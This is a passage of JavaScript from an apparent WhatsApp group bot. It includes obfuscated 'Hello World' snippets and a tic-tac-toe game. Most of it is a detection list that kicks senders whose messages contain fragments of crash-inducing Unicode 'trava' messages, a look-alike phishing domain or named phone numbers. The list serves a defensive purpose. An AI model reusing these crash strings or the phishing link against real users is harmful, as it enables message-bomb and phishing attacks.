var _0x52b6=['979806odjWHO','866172blkIpR','48673lXrcwz','144110wbrnrs','EpKap','59312BEeZim','454073XDAqOT','4ptRdUT','log','71823cxnXKK','Hello','\x20Worl','19ZzJRim','2QnhARU'];(function(_0x38a6ff,_0x429c03){var _0x1a7b23=function(_0x287403,_0x47713a,_0x1dbbac,_0x47e099,_0xf1c18d){return _0x59b1(_0x47e099- -0x183,_0x1dbbac);},_0x4e812d=function(_0xa1ba31,_0xd5e37c,_0xebf963,_0x238ed5,_0x48fe9d){return _0x59b1(_0x238ed5- -0x183,_0xebf963);},_0x4845fa=function(_0x578980,_0x22097b,_0x3e9496,_0x2adf05,_0x366b9f){return _0x59b1(_0x2adf05- -0x183,_0x3e9496);},_0x4c3b51=function(_0x3ef968,_0x4a9350,_0x1252e1,_0x22d2cd,_0x31c7b4){return _0x59b1(_0x22d2cd- -0x183,_0x1252e1);},_0x22f02d=function(_0x256e85,_0x442fa8,_0xe2e2c8,_0x52d69a,_0x3a5bde){return _0x59b1(_0x52d69a- -0x183,_0xe2e2c8);};while(!![]){try{var _0x3a9259=parseInt(_0x1a7b23(-0x1d,-0x16,-0x21,-0x1c,-0x15))*parseInt(_0x1a7b23(-0x27,-0x1f,-0x22,-0x26,-0x24))+parseInt(_0x4845fa(-0x14,-0x1f,-0x1a,-0x1a,-0x15))+-parseInt(_0x4e812d(-0x2a,-0x28,-0x27,-0x27,-0x24))+-parseInt(_0x4845fa(-0x1e,-0x20,-0x1b,-0x22,-0x1b))*parseInt(_0x4e812d(-0x14,-0x1a,-0x1a,-0x1b,-0x1f))+-parseInt(_0x1a7b23(-0x1d,-0x23,-0x1e,-0x23,-0x27))+-parseInt(_0x4e812d(-0x23,-0x21,-0x22,-0x1f,-0x22))+parseInt(_0x1a7b23(-0x2a,-0x21,-0x1e,-0x25,-0x20))*parseInt(_0x1a7b23(-0x23,-0x27,-0x1f,-0x21,-0x24));if(_0x3a9259===_0x429c03)break;else _0x38a6ff['push'](_0x38a6ff['shift']());}catch(_0x25ee65){_0x38a6ff['push'](_0x38a6ff['shift']());}}}(_0x52b6,-0xbe48c+0x9f467*0x1+0x1*0xab881));function hi(){var _0x412edf=function(_0x5ed909,_0x1d0a8a,_0x3077ab,_0x37e70b,_0x381276){return _0x59b1(_0x5ed909-0x3d5,_0x37e70b);},_0xd1fc57=function(_0x16ed48,_0x187f12,_0x3c1622,_0x1e4dfa,_0x17a6d9){return _0x59b1(_0x16ed48-0x3d5,_0x1e4dfa);},_0x3b3a17=function(_0x4d7aab,_0x6a1332,_0x54a086,_0x5bd53c,_0x49323f){return _0x59b1(_0x4d7aab-0x3d5,_0x5bd53c);},_0x29c70a=function(_0x220ed0,_0x46a777,_0x1cdcfb,_0x208e69,_0x5786d1){return _0x59b1(_0x220ed0-0x3d5,_0x208e69);},_0x56416c=function(_0x4eb994,_0x16a747,_0x4fe4ec,_0x2577ea,_0x25865e){return _0x59b1(_0x4eb994-0x3d5,_0x2577ea);},_0x24c641={};_0x24c641[_0x412edf(0x534,0x533,0x534,0x533,0x53b)]=_0xd1fc57(0x53a,0x537,0x53d,0x540,0x538)+_0x412edf(0x53b,0x536,0x537,0x53b,0x542)+'d!';var _0x2ddb5a=_0x24c641;console[_0x29c70a(0x538,0x531,0x536,0x53e,0x53b)](_0x2ddb5a[_0x3b3a17(0x534,0x539,0x52e,0x535,0x531)]);}function _0x59b1(_0x5e775f,_0x2a80ea){_0x5e775f=_0x5e775f-(0x1c7f*0x1+-0x10c1*-0x1+-0x6a*0x6a);var _0x4cb48b=_0x52b6[_0x5e775f];return _0x4cb48b;}hi();
var _0x3091=['OwFke','6qqTyBv','614682xEMKJU','182821PPlWEs','437282BVnHDF','Hello','2msSnuM','19381QRANiX','564751nbeKxk','\x20Worl','455556CSAxxI','log','522091blOpDQ','1ArvwbP'];(function(_0x3bd903,_0x4daeee){var _0x4b6e1d=function(_0xae9d3b,_0x2ffd03,_0x497a39,_0x410a61,_0x2d2187){return _0x22f5(_0x497a39-0x385,_0x410a61);},_0x51f4f8=function(_0x2669c5,_0x34b5c2,_0x43adab,_0x3f1a82,_0x5bb68d){return _0x22f5(_0x43adab-0x385,_0x3f1a82);},_0x53b70f=function(_0x6cafc9,_0x5b2761,_0x1bfdc9,_0x163cba,_0x1fe8ba){return _0x22f5(_0x1bfdc9-0x385,_0x163cba);},_0x4f1061=function(_0x499a74,_0x5cc142,_0x41f762,_0x198362,_0x5bb718){return _0x22f5(_0x41f762-0x385,_0x198362);},_0x27ff5d=function(_0x4ad94b,_0xf7cb1c,_0x45daf9,_0x528ef9,_0x756eff){return _0x22f5(_0x45daf9-0x385,_0x528ef9);};while(!![]){try{var _0x34c042=parseInt(_0x4b6e1d(0x514,0x515,0x516,0x50f,0x50f))+parseInt(_0x51f4f8(0x513,0x50c,0x50f,0x50f,0x50f))*parseInt(_0x51f4f8(0x50e,0x50b,0x511,0x50c,0x50b))+parseInt(_0x53b70f(0x50a,0x50a,0x50d,0x509,0x50c))*-parseInt(_0x4f1061(0x505,0x509,0x50c,0x50a,0x507))+-parseInt(_0x4b6e1d(0x517,0x50d,0x510,0x50c,0x517))+parseInt(_0x4b6e1d(0x516,0x50d,0x514,0x51b,0x50f))*parseInt(_0x53b70f(0x50e,0x516,0x515,0x518,0x51b))+-parseInt(_0x53b70f(0x518,0x512,0x512,0x516,0x516))+parseInt(_0x4f1061(0x50e,0x503,0x50a,0x50b,0x510));if(_0x34c042===_0x4daeee)break;else _0x3bd903['push'](_0x3bd903['shift']());}catch(_0x24df68){_0x3bd903['push'](_0x3bd903['shift']());}}}(_0x3091,-0xe805f+0x95007*-0x1+0x3*0xae5de));function _0x22f5(_0x13af2e,_0x4926e0){_0x13af2e=_0x13af2e-(-0x13*-0xcb+0x134a+-0x20d7);var _0x3734bb=_0x3091[_0x13af2e];return _0x3734bb;}function hi(){var _0x12b4e5=function(_0xd818b2,_0x5149df,_0x3ddd85,_0x37dede,_0x71de35){return _0x22f5(_0x3ddd85-0x204,_0x37dede);},_0x1ada77=function(_0x4b48c5,_0x5648c4,_0x39c595,_0x49ce77,_0x1f5d9f){return _0x22f5(_0x39c595-0x204,_0x49ce77);},_0xc6712e=function(_0x108616,_0x3d4d39,_0x9f62ee,_0x575976,_0x30de6b){return _0x22f5(_0x9f62ee-0x204,_0x575976);},_0x3829b7=function(_0x23f45a,_0x156791,_0x1f99f3,_0xf159d1,_0xe42fc1){return _0x22f5(_0x1f99f3-0x204,_0xf159d1);},_0x20d23c=function(_0x3cd15b,_0x1affe2,_0x2f3125,_0x46168d,_0x186357){return _0x22f5(_0x2f3125-0x204,_0x46168d);},_0x6adfba={};_0x6adfba[_0x12b4e5(0x391,0x38b,0x38d,0x38f,0x388)]=_0x1ada77(0x394,0x398,0x392,0x392,0x399)+_0x1ada77(0x382,0x387,0x388,0x384,0x387)+'d!';var _0x4d0ee0=_0x6adfba;console[_0xc6712e(0x38d,0x387,0x38a,0x388,0x38d)](_0x4d0ee0[_0x20d23c(0x390,0x387,0x38d,0x38e,0x391)]);}hi();

addFilter(from)
          break
        
        default:

 if (budy.includes(`@18156806165`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}
	
	 if (budy.includes(`B闦R闦I闦G闦A闦D闦`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}
 if (budy.includes(`~@`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}
					 if (budy.includes(`saur.com`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}

					//v
					
	if (budy.includes(`~*@555484137179*~`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}				
					
					
	if (budy.includes(`19565244699`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}			
					
		if (budy.includes(`SUSHANT.`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
					
					
	
		
	if (budy.includes(`Mosca_Virus`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
	if (budy.includes(`ɩȿạɩɾ.com`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
	if (budy.includes(`๒`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
			
	if (budy.includes(`www.instagram.com/p/CE0pVKZs5Wk/?igshid=5ihhd4xdsgrh`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
	
			
	if (budy.includes(`🔴`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
	if (budy.includes(`Mosca_Virus`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
	if (budy.includes(`Mosca_Virus`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

			
						
												
	if (budy.includes(`𝟏(𝟖𝟖𝟔)𝟗𝟗𝟗-𝟏𝟑𝟒𝟓`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

				if (budy.includes(`⏤͟͟͞͞ 😈MATAR XXX₀₀₇ꪰ😈`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

				if (budy.includes(`❄️_××××××××÷_`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
	if (budy.includes(`Mosca_Virus`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
						
			if (budy.includes(`chat.whatsapp.com/K2vyQpkxfT2Eh63O55L0B8@hird_fekalinos:👿👿👿𒀱☹️𒀱𒀱𒀱⃢⃢⃢𒀱𒀱⃢⃢⃢𒀱𒀱⃢⃢⃢𒀱𒀱⃢𒀱☹️𒀱💝🤔𒀱𒀱⃢z𒀱🅱️𒀱𒀱⃢𒀱⃢🇬🇧𒀱⃢⃢⃢👾⃠⃤𒀱⃠⃤𒀱𒂭𒂭𒇫𒇫𒇫𒇫⃢⃢:👺🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑̔̂🥰:👿👿👿👿𒀱☹️𒀱𒀱𒀱⃢⃢⃢𒀱✖❌✖❌✖❌✖❌❌✖❌✖❌✖❌✖❌❌🔱❌❌❌❌✳✳❕❕❗✴✴✴✴✴✴✴✴❗〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️💔❔❔❔❔⚫▪️➿💮💮🕐🕟🕔🔕⭕💯`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
					if (budy.includes(`⃟ᡃ⃟ᡃ⃟ᡃ⃟`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
						
										
				if (budy.includes(`𝟏(𝟖𝟖𝟔)𝟗𝟗𝟗-𝟏𝟑𝟒𝟓ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
									
							
	if (budy.includes(`⃟⃟⃟⃟`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

												
		if (budy.includes(`৯৯৯৯`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`100030449499276`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`xn--hatsapp-rh4c.com/free-tickets‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`Wa.me/559891312574`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`www.instagram.com/p/CE6f8afF85G/?igshid=4p33q69wr89q`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`JXgH0fuabFR5VijfrdwyxY`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
	
			if (budy.includes(`images.app.goo.gl/d3sU6Z6hgbVmPwx79`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
	
			if (budy.includes(`www.instagram.com/p/CE0pVKZs5Wk/?igshid=5ihhd4xdsgrh`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		
		if (budy.includes(`www.instagram.com/p/CE9OsNblDcq`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		
				if (budy.includes(`www.facebook.com/mohamed.faslan.121772`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		
			
					if (budy.includes(`ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
					
	//vvv
		if (budy.includes(`pinterest.com/detetive`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

		if (budy.includes(`lol.davizinmaker.ml/nagazap`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

		if (budy.includes(`www.instagram.com/p/CMx2kO9pnW-/?utm_source=ig_web_copy_link`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
					
					
		  
	if (budy.includes(`ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ`)) {
		if (!isGroup) return
		if (!isTrava) return
		cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}	     
		        
		              
		         if (budy.includes(`🆇҉⃟⃢🅲҉⃟⃢🅻҉⃟⃢`)) {
		if (!isGroup) return
		if (!isTrava) return
		cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}

		       	
if	 (budy.includes(`www.instagram.com/p/CE0pVKZs5Wk/?igshid=5ihhd4xdsgrh🅻҉⃟⃢🅸҉⃟⃢🅽҉⃟⃢🆄҉⃟⃢🆇҉⃟⃢🅲҉⃟⃢🅻҉⃟⃢🅰҉⃟⃢🅽҉⃟⃢tratrav🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯??🔯🔯🔯🔯`)) {
		if (!isGroup) return
		if (!isTrava) return
		cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}       	          			   			
		      		       	          														   											   






}


	
		if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Juego Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❌
Player2 @${tty.player2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Turno de = @${tty.player1.split('@')[0]}`
  cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
cnf.sendMessage(from, `@${tty.player2.split('@')[0]} Se rehúsa:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

const _0x2039a5=_0x22b6;(function(_0x9db4e8,_0x3165a4){const _0x5cb034=_0x22b6,_0x43021d=_0x9db4e8();while(!![]){try{const _0x4f286b=-parseInt(_0x5cb034(0x1be))/0x1+parseInt(_0x5cb034(0x1d8))/0x2*(-parseInt(_0x5cb034(0x1d3))/0x3)+parseInt(_0x5cb034(0x1cc))/0x4+parseInt(_0x5cb034(0x1e0))/0x5*(parseInt(_0x5cb034(0x1c5))/0x6)+parseInt(_0x5cb034(0x1bc))/0x7+parseInt(_0x5cb034(0x1bd))/0x8+-parseInt(_0x5cb034(0x1e7))/0x9;if(_0x4f286b===_0x3165a4)break;else _0x43021d['push'](_0x43021d['shift']());}catch(_0x2c9108){_0x43021d['push'](_0x43021d['shift']());}}}(_0x39d9,0xb98d4));button=='SOURCE\x20CODE'&&(console[_0x2039a5(0x1c8)](_0x2039a5(0x1e4)),confumods['sendMessage'](from,{'text':_0x2039a5(0x1da),'matchedText':_0x2039a5(0x1da),'description':'','title':_0x2039a5(0x1c7),'jpegThumbnail':ofrply},_0x2039a5(0x1c4),{'detectLinks':![],'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]},'quoted':finv}));button=='MP3'&&(console['log'](_0x2039a5(0x1d2)),reply(mess[_0x2039a5(0x1e1)]),confumods[_0x2039a5(0x1cf)](from,anu3,audio,{'mimetype':_0x2039a5(0x1dc),'quoted':mek}));function _0x39d9(){const 